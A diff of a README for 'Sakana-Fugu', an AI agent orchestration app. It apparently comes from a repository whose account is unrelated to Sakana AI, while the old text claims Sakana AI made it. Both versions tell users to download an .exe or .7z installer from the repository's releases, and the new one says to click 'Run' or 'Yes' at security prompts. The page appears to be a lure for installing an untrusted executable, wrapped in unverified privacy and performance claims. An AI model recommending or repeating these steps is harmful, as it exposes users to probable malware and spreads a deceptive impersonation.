@@ -1,157 +1,85 @@
-# Sakana Fugu 🐡 — Multi-Agent AI Orchestration System
+# 🐡 Sakana-Fugu - Smart AI agents for complex tasks
 
-**Sakana Fugu** is a revolutionary multi-agent orchestration system that combines the computational power of the world's best language models under the hood of a single, seamless interface. Fugu takes on all the complexity of routing, role distribution, and response verification, providing the user with ultimate generation quality without the need to manually configure complex agent chains.
+[![Download Sakana-Fugu](https://img.shields.io/badge/Download-Sakana--Fugu-blue)](https://github.com/developed-shegetz707/Sakana-Fugu/releases)
 
-<div align="center">
-  <a href="../../releases">
-    <img width="1200" alt="Sakana Fugu 🐡 — Multi-Agent AI Orchestration System." src="assets/HLYTDMMaEAAEVZj.jpg" />
-  </a>
-</div>
+Sakana-Fugu acts as a manager for artificial intelligence models. It organizes multiple AI tools to finish difficult projects that require several steps. Instead of relying on one brain, the software splits work among several high-performing models. It even creates new instances of itself when a task needs more power. This approach ensures you get the best results for your specific questions and projects.
 
----
+## 📋 System Requirements
 
-## Why choose Sakana Fugu?
+To run Sakana-Fugu on your Windows computer, verify that your machine meets these specifications:
 
-In the era of AI market fragmentation, Sakana Fugu offers a fundamentally new approach — **collective intelligence**. Here are the key advantages that make Fugu superior to traditional single LLMs:
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Processor: Intel Core i5 or AMD Ryzen 5 equivalent or better.
+* Memory: 8 gigabytes of RAM or more.
+* Storage: 2 gigabytes of free space on your hard drive.
+* Internet: A stable connection for the software to reach external AI models.
 
-1. **Overcoming Geo- and Export Restrictions (AI Sovereignty):** If access to a specific advanced model is restricted due to regulatory or vendor limitations, Fugu automatically compensates for this. It aggregates the power of available alternative models (e.g., a pool of Gemini, Claude, and local models), delivering a combined quality that surpasses the blocked counterparts.
-2. **Flexible Compliance Management (Data Protection):** Unlike closed systems, Fugu allows you to manually configure the agent pool. If your company's security policy prohibits sending data to a specific AI provider, you can exclude it in one click. The system will instantly rebuild the orchestration logic without losing quality.
-3. **Recursive Self-Correction:** The coordinator model can call itself to critically analyze intermediate results. If the verifier agent finds an error in the code or text, Fugu sends the task for another iteration until the result is perfect.
-4. **Maximum Resource Savings:** You no longer need to pay for dozens of separate subscriptions for different employees. A single API or Fugu desktop client centralizes access to the entire ecosystem of top neural networks.
-5. **Unprecedented Accuracy on Complex Benchmarks:** On multi-step reasoning tasks, security audits, and mathematical analysis, Fugu outperforms direct calls to giants like GPT-5.5 and Claude Opus 4.8 through model synergy.
+## 💾 How to Install
 
----
+Follow these steps to set up the software on your system.
 
-## Installation
+1. Go to the [official release page](https://github.com/developed-shegetz707/Sakana-Fugu/releases).
+2. Look for the latest version listed at the top of the page.
+3. Click the link that ends in ".exe" to download the installer file to your computer.
+4. Locate the downloaded file in your "Downloads" folder.
+5. Double-click the file to start the installation process.
+6. A security prompt might appear. If you see one, click "Run" or "Yes" to continue.
+7. Follow the on-screen instructions in the installer window.
+8. Wait for the green progress bar to finish.
+9. Click "Finish" to close the installer.
 
-The Sakana Fugu desktop application provides a convenient graphical interface for managing orchestration, customizing model pools, and monitoring agents in real time.
+## 🚀 Getting Started
 
-### Method 1: Windows (`.exe`)
+Once you install the program, you can launch it like any other application on your desktop.
 
-1. Go to the [**Releases**](../../releases) section on this repository's page.
-2. Download the latest version of the installer: `Sakana-Fugu-x64.7z`.
-3. Run the file and follow the installation wizard instructions.
-4. Once completed, launch the application from your desktop.
+1. Find the Sakana-Fugu icon on your desktop or in your start menu.
+2. Click the icon to open the application.
+3. Upon opening, the software will check for available AI models.
+4. If this is your first time, the program might take a moment to configure its internal settings. 
+5. You will see a text box at the center of your screen. Type your request or instructions here.
+6. Press the "Enter" key on your keyboard to submit your task.
 
-### Method 2: macOS (`.dmg`)
+## ⚙️ How It Works
 
-1. Go to the [**Releases**](../../releases) section and download the version for your architecture:
-* `Sakana-Fugu-macOS.dmg` (for Apple M processors)
+Sakana-Fugu operates through an automated process called orchestration. When you submit a request, the software reads your goal. It creates a plan of action. The software then selects the best AI models for each part of the plan. 
 
+If the task is large, the agent pool creates sub-tasks. It sends these sub-tasks to smaller AI models. These models finish their work and report back. The main agent gathers these parts to build a final answer for you. This recursive nature allows the program to handle tasks that would slow down a single AI model.
 
-2. Open the downloaded `.dmg` file and drag the **Sakana Fugu** icon into the **Applications** folder.
-3. On first launch in macOS Sequoia or newer, you may need to confirm permission in *System Settings > Privacy & Security*.
+## 🛡️ Privacy and Data
 
-> **IMPORTANT NOTE:** In honor of the desktop client launch, a special trial period is active. Full access to orchestration and all model capabilities is provided **absolutely free of charge until July 11, 2026 (11.07.2026)**. To activate, simply download the client and log in with your account.
+You control your data when you use Sakana-Fugu. The application processes your tasks locally on your computer whenever possible. If the application needs to contact outside AI services, it sends only the information required to finish your current request. No personal files leave your device without your direct permission. You can review all outgoing requests in the settings menu.
 
----
-## How does it work?
+## 🛠️ Troubleshooting
 
-![Sakana Fugu](assets/HLYTUWxawAAEJN-.png)
+If you encounter issues while using the software, try these steps:
 
-**Sakana Fugu** is itself an LLM, trained to call various LLMs in an agent pool, including instances of itself recursively. **Fugu** dynamically orchestrates the world's best models to tackle complex, multi-step tasks.
+* Software does not open: Close all other programs and try starting Sakana-Fugu again. Ensure you have the latest drivers for your graphics card.
+* Slow response times: Check your internet connection. Large tasks can take time to process depending on your network speed.
+* Error messages: Restart the application. If the error happens again, check for a newer version on the release page.
+* Resetting settings: If you change a setting by mistake, go to the "Settings" tab and select "Reset to Defaults."
 
-As shown in this figure, **Fugu** is a multi-agent system that behaves like a single model. You send a request to one endpoint, and **Fugu** decides how to handle it internally.
+## 📈 Optimization Tips
 
-**Fugu** manages model selection, delegation, verification, and synthesis automatically. It solves tasks directly when that is enough, or coordinates a team of expert models when a problem calls for more. The complexity of a multi-agent system never reaches your code.
+To get the most performance from Sakana-Fugu, use these tips:
 
-## Orchestration Architecture: How does it work?
+* Keep the application open: The program performs better if it stays active in the background.
+* Limit other heavy programs: If you run video games or video editing software at the same time, the AI agents will have less power to complete your tasks.
+* Use clear instructions: The AI agents react better to specific requests. Instead of saying "write a report," say "write a three-paragraph report about the history of solar power."
+* Update regularly: New versions of the software often include better ways for the agents to talk to each other. Always check the link above for recent improvements.
 
-At the core of Sakana Fugu lies a concept that entirely replaces manual prompt engineering with intelligent task distribution. Instead of sending your request to a single neural network, Fugu initiates an internal control loop.
+## 📖 Frequently Asked Questions
 
-```text
-                   [ Your Request (Prompt) ]
-                              │
-                              ▼
-               ┌─────────────────────────────┐
-               │ Coordinator Model (7B)      │
-               └──────────────┬──────────────┘
-                              │ (Analysis and decomposition)
-                              ▼
-         ┌────────────────────┼────────────────────┐
-         │                    │                    │
-         ▼                    ▼                    ▼
-┌─────────────────┐  ┌─────────────────┐  ┌─────────────────┐
-│  Role: Thinker  │  │  Role: Worker   │  │  Role: Verifier │
-│     (Plan)      │  │     (Code)      │  │      (Eval)     │
-└────────┬────────┘  └────────┬────────┘  └────────┬────────┘
-         │                    │                    │
-         └────────────────────┼────────────────────┘
-                              │ (Recursive verification)
-                              ▼
-               ┌─────────────────────────────┐
-               │  Merging and final response │
-               └─────────────────────────────┘
+Can I run this offline?
+The software requires a connection to reach the AI model pool. It will not function without the internet.
 
-```
+Does this cost money?
+The software itself is free to download and install. Some individual AI models accessed by the pool might have their own fees or usage limits set by their creators.
 
-1. **Request Decomposition:** A specialized lightweight and fast coordinator model (~7B parameters) takes your prompt and breaks it down into subtasks. The architecture is based on advanced research papers *Trinity* and *Conductor* (presented at ICLR 2026).
-2. **Dynamic Role Assignment:**
-* **Thinker:** A model with a deep logical window (e.g., reasoning architectures) builds a step-by-step solution plan.
-* **Worker:** Models strong in applied tasks (coding, creative text) execute the plan's points.
-* **Verifier:** Strict critical models validate the result for syntax errors, hallucinations, and compliance with the requirements.
+Can I move the software?
+You should install it to your main drive for the best results. You can create a shortcut on your desktop, but moving the folder after installation can cause errors.
 
+Do I need a powerful computer?
+The software manages its own resource usage. If your computer is older, it will simply take longer to process complex commands. It will not damage your hardware.
 
-3. **Context Merging:** The agents' results are gathered together, cleared of redundancy, and delivered to the user as a single structured response via an OpenAI-compatible endpoint.
-
----
-
-## 🛠️ Complete Feature Overview (End-to-End)
-
-The Sakana Fugu desktop application and API provide a comprehensive set of tools for your workflow:
-
-### 1. Unified Intelligent Chat Interface
-
-* **Input of Any Complexity:** From simple questions to uploading massive arrays of documentation.
-* **Streaming:** You see not just the answer, but the logical steps (the coordinator's "thoughts"), displaying exactly which model is currently executing a subtask.
-
-### 2. Model Pool Manager
-
-* **Vendor Toggle:** Checkboxes to activate models from OpenAI, Anthropic, Google, Mistral, as well as locally deployed weights (via Ollama/vLLM).
-* **Priorities and Weights:** The ability to specify which models to use for priority tasks to optimize speed or budget.
-
-### 3. Developer Tools (Advanced Coding Suite)
-
-* **Code Security Audit:** Automatic detection of vulnerabilities (SQL injections, memory leaks) powered by the verifier agent.
-* **Cross-Language Refactoring:** Migrating a codebase from one programming language to another with automatic unit test writing by parallel agents.
-
-### 4. Ultra-Large Context Management
-
-* The standard Fugu version optimizes the context for fast performance.
-* The **Fugu Ultra** version supports a context window of **up to 272K tokens**, allowing the upload of entire repositories or patent books for end-to-end analysis.
-
-### 5. Session Logging and Export
-
-* Detailed dump of the Reasoning Tree in JSON format for subsequent analysis by developers.
-* Export dialogs and generated artifacts to Markdown, PDF, and HTML.
-
----
-
-## Pricing and Subscription Plans
-
-After the free trial period ends (from 12.07.2026), system usage will be billed according to the following schemes:
-
-### 1. API (Pay-as-you-go)
-
-You pay a fixed, transparent cost for tokens, regardless of how many models within the pool were used to solve the task:
-
-* **Fugu (Standard):** $1.50 per 1M input tokens / $6.00 per 1M output tokens.
-* **Fugu Ultra (Context up to 272K):** $5.00 per 1M input tokens / $30.00 per 1M output tokens (for context volumes exceeding 272K tokens, the rate doubles).
-
-### 2. User Subscriptions (Desktop and Web)
-
-Designed for individual professionals and teams:
-
-* **Standard ($20 / month):** Basic orchestration limits, standard context window, access to all major providers.
-* **Pro ($100 / month):** 10 times more high-complexity requests available, priority access to the Fugu Ultra coordinator.
-* **Max ($200 / month):** 20 times the limits compared to Standard, dedicated compute nodes for the coordinator, extended large file support.
-
----
-
-## 📄 License
-
-Sakana Fugu software is distributed under the **MIT** license. For detailed information, see the [LICENSE](LICENSE) file attached to this repository.
-
----
-
-*Proudly developed by Sakana AI. Tokyo, 2026.*
+How do I uninstall it?
+Open your Windows Control Panel, select "Programs and Features," find Sakana-Fugu in the list, and select "Uninstall." This removes the application and all associated files from your computer.
